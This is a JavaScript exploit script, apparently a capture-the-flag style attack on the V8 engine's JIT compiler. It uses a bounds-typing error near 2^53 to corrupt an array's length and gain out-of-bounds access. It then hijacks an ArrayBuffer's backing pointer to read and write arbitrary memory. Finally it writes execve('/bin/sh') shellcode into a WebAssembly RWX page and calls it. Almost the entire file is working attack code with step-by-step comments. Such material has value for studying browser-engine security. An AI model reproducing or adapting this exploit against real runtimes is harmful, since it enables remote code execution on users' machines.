function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
}
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();
function f(x, w)
{
	const arr = new Array(0.1, 1.1, 2.2, 3.3, 4.4, 5.5);
	const oobArr = [13.37];
	const ab = new ArrayBuffer(0x123);
	const sig = {a:0xdead,b:0xbeef,c:wmain};
	// if we allocate in this way these 4 objects will be adjacent
	// but if we allocate them outside, objects will be too far
	let t = (x == 1 ? 9007199254740992 : 9007199254740989) + 1 + 1;
	t -= 9007199254740989+2; // t can be 3, but expect <= 1
	t *= 4; // t can be 12, but expect <= 4
	gOobArr = oobArr;
	gSig = sig;
	gAb = ab; // export these 3 objects to global
	if (w)
	// rewrite only if w is set,
	// so it will only rewrite when we want
	// that is when we are sure JIT is triggered
		arr[t] =  1.08646184497421942533702769401E-311;
		// Smi(0x200), write length field of oobArray
	return arr[t];
}

console.log(f(1, 1));
console.log(f(0, 1));
// although w is set, but JIT cannot be done here
// so rewriting will not have any OOB write
for (var i = 0; i < 0x2000; i++)
{
	console.log(f(1, 0));
	console.log(f(0, 0));
}
// in this way all possible input values are covered
// at this point JIT must be done

console.log(f(1, 1));
// trigger OOB write, write to length of gOobArr
if(gOobArr.length !== 0x200)
	throw Error("failed to corrupt array size!");
dp(gOobArr);
dp(gAb);

// now gOobArr have OOB access
// next, we find ArrayBuffer and sig
var backingPos, wmainAddr;
for (let i = 0; i < gOobArr.length-2; i++)
{
	if (d2u(gOobArr[i]) === 0x12300000000)
	{// find ArrayBuffer
		backingPos = i + 1;
	}
	else if (d2u(gOobArr[i]) === 0xdead00000000 &&
		d2u(gOobArr[i+1]) === 0xbeef00000000)
	{// find sig object, and extract wmain address
		wmainAddr = d2u(gOobArr[i+2]) - 1;
	}
}

assert(backingPos !== undefined, "failed to find ArrayBuffer")
assert(wmainAddr !== undefined, "failed to find sig array")
print("[*] index of backing field = " + hex(backingPos));
print("[*] address of wmain function = " + hex(wmainAddr));

const dataView = new DataView(gAb);
function memRead(addr)
{
	gOobArr[backingPos] = u2d(addr);
	return d2u(dataView.getFloat64(0, true));
}
// so now we can rewrite backing field
// to acheive arbitrary read

rwxAddr = memRead(wmainAddr - 240);
// by debugging,
// wmainAddr-240 seems store the rwx page address
print("[*] RWX page = " + hex(rwxAddr));

gOobArr[backingPos] = u2d(rwxAddr);
// set backing field to rwx page

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode

throw Error("failed to get shell");